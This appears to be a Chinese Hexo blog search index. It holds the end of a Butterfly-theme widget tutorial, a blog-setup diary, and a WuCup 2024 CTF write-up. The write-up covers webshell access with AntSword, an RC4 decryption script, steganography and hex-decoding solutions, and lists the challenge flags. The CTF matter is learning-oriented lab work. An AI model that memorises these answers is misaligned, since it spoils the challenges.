language_">window</span>.<span class="property">onload</span> = showWelcome;</span><br><span class="line"><span class="comment">// 如果使用了pjax在加上下面这行代码</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;pjax:complete&#x27;</span>, showWelcome);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意是根目录下的source文件夹哦，没有js文件夹自己新建一个，不是主题目录的source文件夹！！</p><p>接着，在主题配置文件[BlogRoot]_config.butterfly.yml中引入jQuery依赖和刚刚的js文件：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">inject: </span><br><span class="line">  bottom: </span><br><span class="line"><span class="addition">+    - &lt;script src=&quot;https://cdn.staticfile.org/jquery/3.6.3/jquery.min.js&quot;&gt;&lt;/script&gt; # jQuery</span></span><br><span class="line"><span class="addition">+    - &lt;script async data-pjax src=&quot;/js/txmap.js&quot;&gt;&lt;/script&gt; # 腾讯位置API</span></span><br></pre></td></tr></table></figure><h2 id="调整小组件的位置"><a href="#调整小组件的位置" class="headerlink" title="调整小组件的位置"></a>调整小组件的位置</h2><p>在需要展示文本的容器上添加相应id（welcome-info）就可以了，例如我想添加在网站公告栏信息的下方，于是就在[BlogRoot]\themes\butterfly\layout\includes\widget\card_announcement.pug的最后一行加上这个，缩进与上一行相同即可。同理，如果想在其他卡片的下方添加，只需要打开对应的.pug文件修改即可，以announcement公告栏下方添加为例，我们只需要添加一行：#welcome-info 即可，如下图所示：</p><p><img src="/img/location/location4.png"></p><p>同理，如果是在作者介绍的卡片下方添加这个组件，则需要打开相同目录下的“card_author.pug”，做相同处理即可。</p><p><img src="/img/location/location5.png"></p><h2 id="修改css文件，个性化组件（颜色，大小等等）"><a href="#修改css文件，个性化组件（颜色，大小等等）" class="headerlink" title="修改css文件，个性化组件（颜色，大小等等）"></a>修改css文件，个性化组件（颜色，大小等等）</h2><p>新建[BlogRoot]\source\css\custom.css，并写入如下代码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 欢迎信息 */</span></span><br><span class="line"><span class="selector-id">#welcome-info</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(<span class="number">45deg</span>, <span class="number">#b9f4f3</span>, <span class="number">#e3fbf9</span>);</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">18px</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">8px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#welcome-info</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#212121</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与js文件同理，在主题配置文件[BlogRoot]_config.butterfly.yml中引入css文件</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inject: </span><br><span class="line">  head: </span><br><span class="line">    - &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/custom.css&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="结束了，看看成果"><a href="#结束了，看看成果" class="headerlink" title="结束了，看看成果"></a>结束了，看看成果</h2><p>使用hexo cl和hexo s，在localhost:4000上查看自己的配置</p><p>如果不放心，可以打开刚刚的腾讯定位工具，查看应用详情</p><p>发现ip定位得到了调用，诶，这就说明已经成功进行了操作了，如下图</p><p><img src="/img/location/location6.png"></p><p>你会发现其他的都没有被调用，那么说明只需要一个ip定位的功能就足够喽</p><p>至此，我们已经完成了整个小组件的安装，感谢你看到这里！！</p>]]></content>
      
      
      <categories>
          
          <category> 博客折腾日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客搭建 </tag>
            
            <tag> 避坑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客折腾日记（一）：浅谈使用hexo搭建博客的过程</title>
      <link href="/2024/12/05/%E5%8D%9A%E5%AE%A2%E6%8A%98%E8%85%BE%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2024/12/05/%E5%8D%9A%E5%AE%A2%E6%8A%98%E8%85%BE%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>关于搭建博客的一些杂谈</p><p>以此文章来记录我搭建博客的全过程</p><p>首先，特别鸣谢为我搭建博客提供指导的 hicancan，yolo，seandictionary与st4rr ！！！</p><h1 id="搭建的原因"><a href="#搭建的原因" class="headerlink" title="搭建的原因"></a>搭建的原因</h1><p>至于为什么要搭建这个博客，其实是有”跟风”的成分在，看到周围认识的一些厉害的大佬们都搭建了自己的博客，而且非常的美观，于是我也有了搭建一个属于自己的博客的想法。但是更多的是想把自己写的一些笔记，一些文章放到网站上，这样可以随时查阅，写的wp也方便互相交流讨论。</p><h1 id="搭建的步骤"><a href="#搭建的步骤" class="headerlink" title="搭建的步骤"></a>搭建的步骤</h1><p>1.我先买了一个域名，也就是现在的Z41sArrebol.top，紧接着放到DNS解析，然后与github page进行绑定</p><p>2.接着就是最基本的，git，nodejs，涉及到申请github的账号，绑定ssh之类。</p><p>3.执行简单的一些npm和hexo命令，参考了很多的博客。</p><p>4.选一个自己喜欢的主题。为了更好的魔改我选择了有更多教程的butterfly。</p><p>4.修改主题文件，完成博客基本个性化设置（yysy这一步是最浪费时间的）</p><p>5.通过引入css文件魔改博客，更换主题，美化。</p><p>6.把更改好的个性化主题部署到github page即可。</p><h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h1><p>上面的描述看似云淡风轻，实则耗费了我大量的时间，真的很羡慕那些一两天就能搭起来的大佬qaq</p><h2 id="问题一：DNS解析出问题，无法正常绑定github-page"><a href="#问题一：DNS解析出问题，无法正常绑定github-page" class="headerlink" title="问题一：DNS解析出问题，无法正常绑定github page"></a>问题一：DNS解析出问题，无法正常绑定github page</h2><p>解决方法：阿里云内部解决，把域名经过实名认证即可正常解析，绑定（还好没用腾讯云，因为腾讯云的实名认证必须成年）</p><h2 id="问题二：git端口出现问题"><a href="#问题二：git端口出现问题" class="headerlink" title="问题二：git端口出现问题"></a>问题二：git端口出现问题</h2><p>（ssh: connect to host localhost port 22: Connection refused）</p><p>这个是一开始还没开始配置主题文件的时候出现的问题，正常的拉取包都会报错</p><p>解决方法：直接把错误信息扔到Google上面搜索，果然有类似的博客，把原本的端口用命令改了一下就可以了</p><h2 id="问题三：css文件引入出问题"><a href="#问题三：css文件引入出问题" class="headerlink" title="问题三：css文件引入出问题"></a>问题三：css文件引入出问题</h2><p>搭好了基本框架之后，我想美化一下自己的博客，于是开始修改主题的配置文件，比如深色模式，背景图片设置之类的基础设置。但是随着“魔改”的深入，我发现高级的配置都是要加css文件和js文件的，然后在主题文件的inject项中进行引入，但是在添加了这些文件之后我的博客并没有发生变化，换句话说，我做的设置都没有生效。</p><p>（其实我也不需要很花里胡哨的设置，但是把卡片设置透明度这一项在我看来是必须的）</p><p>实在无果我就重新把hexo装了一遍，还是无济于事，最后经过大量的搜索我终于发现了问题！</p><p>一开始我是在主题文件的css文件夹中引入css文件，因为他默认是有css文件夹的，但其实是要在根目录的source文件夹里面添加css文件夹，然后再把css文件放到里面，这样才会生效，默认的source文件夹下是没有css文件夹的，让我一直在死胡同里面绕圈））</p><h2 id="问题四：写markdown上传图片效率过低"><a href="#问题四：写markdown上传图片效率过低" class="headerlink" title="问题四：写markdown上传图片效率过低"></a>问题四：写markdown上传图片效率过低</h2><p>解决方案：使用github图床可以快速的上传图片，而不需要像我之前一张一张的引用一张一张的重命名了哈哈哈，虽然现在还没有彻底弄好，但是还是感谢yolo，为我提供了写markdown文件的新思路！！</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次配置博客大体上算是成功了，看着自己搭起来的博客，非常有成就感。未来还会不断进行魔改与组件添加。</p><p>但是博客仍然有很多不足，比如评论系统还没有成功搭建，写markdown上传图片效率过低，没有应用图床等问题，后续慢慢折腾慢慢弄吧，人生就是要不断奋斗的（笑）</p>]]></content>
      
      
      <categories>
          
          <category> 博客折腾日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 WuCup CTF wp</title>
      <link href="/2024/12/02/WuCup%20CTF/"/>
      <url>/2024/12/02/WuCup%20CTF/</url>
      
        <content type="html"><![CDATA[<p>0xGame作为笔者的启蒙赛事，笔者从中学习到了一些CTF的基本知识，而WuCup则是笔者第一个独立参加的网络赛事。</p><p>虽然只做出来四道题，但是99%的步骤都是本人完成))</p><p>恰逢笔者的博客基本搭建完成，所以兴奋的把本来用PDF提交的wp转成.md格式扔到这里</p><h1 id="Web-Sign"><a href="#Web-Sign" class="headerlink" title="Web-Sign"></a>Web-Sign</h1><p>开启题目环境后，使用webshell工具中国蚁剑连接</p><p>题目环境已经告知密码passwd为sgin</p><p><img src="/img/WuCup/WuCup1.png"></p><p>连接后打开最上层的目录，在最底下发现flag的文件夹</p><p><img src="/img/WuCup/WuCup2.png"><br><img src="/img/WuCup/WuCup3.png"></p><p>WuCup{253e7c29-a436-4f17-bce2-72ce13731ba3}</p><h1 id="Crypto-easy"><a href="#Crypto-easy" class="headerlink" title="Crypto-easy"></a>Crypto-easy</h1><p>观察应该是RC4加密，直接扔kimi写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&quot;hello world&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化s和t数组</span></span><br><span class="line">s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">t = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> key] * (<span class="number">256</span> // <span class="built_in">len</span>(key)) + [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> key][:(<span class="number">256</span> % <span class="built_in">len</span>(key))]</span><br><span class="line"></span><br><span class="line"><span class="comment"># RC4算法生成密钥流</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j = (j + s[i] + t[i]) % <span class="number">256</span></span><br><span class="line">    s[i], s[j] = s[j], s[i]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于解密的索引</span></span><br><span class="line">i = j = <span class="number">0</span></span><br><span class="line">flag_encrypted = [</span><br><span class="line">    <span class="number">0xd8</span>, <span class="number">0xd2</span>, <span class="number">0x96</span>, <span class="number">0x3e</span>, <span class="number">0x0d</span>, <span class="number">0x8a</span>, <span class="number">0xb8</span>, <span class="number">0x53</span>, <span class="number">0x3d</span>, <span class="number">0x2a</span>, <span class="number">0x7f</span>, <span class="number">0xe2</span>, <span class="number">0x96</span>, <span class="number">0xc5</span>, <span class="number">0x29</span>, <span class="number">0x23</span>,</span><br><span class="line">    <span class="number">0x39</span>, <span class="number">0x24</span>, <span class="number">0x6e</span>, <span class="number">0xba</span>, <span class="number">0x0d</span>, <span class="number">0x29</span>, <span class="number">0x2d</span>, <span class="number">0x57</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x32</span>, <span class="number">0x2c</span>, <span class="number">0x3a</span>, <span class="number">0x77</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x2d</span>, <span class="number">0xfa</span>, <span class="number">0x72</span>, <span class="number">0x61</span>, <span class="number">0xb8</span>, <span class="number">0x4f</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密flag</span></span><br><span class="line">flag_decrypted = []</span><br><span class="line"><span class="keyword">for</span> byte <span class="keyword">in</span> flag_encrypted:</span><br><span class="line">    i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">    s[i], s[j] = s[j], s[i]</span><br><span class="line">    x = (s[i] + s[j]) % <span class="number">256</span></span><br><span class="line">    flag_decrypted.append(byte ^ s[x])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将解密后的bytes转换为字符串</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> flag_decrypted)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>最后扔到编译器运行就行</p><p><img src="/img/WuCup/WuCup4.png"></p><p>WuCup{55a0a84f86a6ad40006f014619577ad3}</p><h1 id="Misc-原神启动"><a href="#Misc-原神启动" class="headerlink" title="Misc-原神启动"></a>Misc-原神启动</h1><p>打开压缩包之后只有一张图片和一个加密的word文档</p><p>Winhex打开发现就是正常的png文件，考虑其他隐写方式</p><p>扔到stegsolve里面看看</p><p><img src="/img/WuCup/WuCup5.png"></p><p>很清楚的打开了第一层加密，里面是一个word文档，打开后只有 原神启动！这几个字</p><p>网上搜索，改成.zip格式再进行分析</p><p>分析压缩包，发现在word&#x2F;media目录下有一个image1.png图片，打开很容易发现一行字</p><p><img src="/img/WuCup/WuCup6.png"></p><p>为了更清楚一点，还是扔到stegsolve进行处理</p><p><img src="/img/WuCup/WuCup7.png"></p><p>此为第二层加密</p><p>打开后，发现还有一个被加密的txt文件，因为没有发现其他线索，优先考虑伪加密</p><p>扔到winhex里面，发现只是正常的加密</p><p>故重新返回目录.xml文件进行寻找</p><p>考虑到一二层的密码都为WuCup{ }格式，猜想第三层密码也相同，但在所有文件搜索WuCup都没有结果</p><p>于是缩小范围，搜索Wu和”{“，最终在document.xml中发现了线索（标蓝色的）</p><p><img src="/img/WuCup/WuCup8.png"></p><p>仔细往后看不难发现所有的元素组合起来即为一个标准的flag格式（如下图）</p><p><img src="/img/WuCup/WuCup9.png"></p><p>（此处换了个编辑器，显示的会更明显）</p><p>组合起来可得到第三层密码：WuCup{f848566c-3fb6-4bfd-805a-d9e102511784}</p><p>输入密码得到txt文件</p><p><img src="/img/WuCup/WuCup10.png"></p><p>WuCup{0e49b776-b732-4242-b91c-8c513a1f12ce}</p><h1 id="Misc-Sign"><a href="#Misc-Sign" class="headerlink" title="Misc-Sign"></a>Misc-Sign</h1><p>签到题，十六进制的字符串，扔cyberchef里面直接出</p><p><img src="/img/WuCup/WuCup11.png"></p><p>WuCup{df357d47-31cb-42a8-aa0c-6430634ddf4a}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
